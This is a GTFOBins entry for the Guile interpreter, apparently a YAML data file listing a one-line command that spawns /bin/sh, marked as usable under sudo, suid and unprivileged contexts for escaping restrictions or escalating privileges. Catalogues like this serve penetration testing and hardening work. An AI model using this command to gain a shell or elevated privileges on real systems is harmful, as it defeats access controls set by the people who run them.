<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/guile -->
---
functions:
  shell:
  - code: |-
      guile -c '(system "/bin/sh")'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
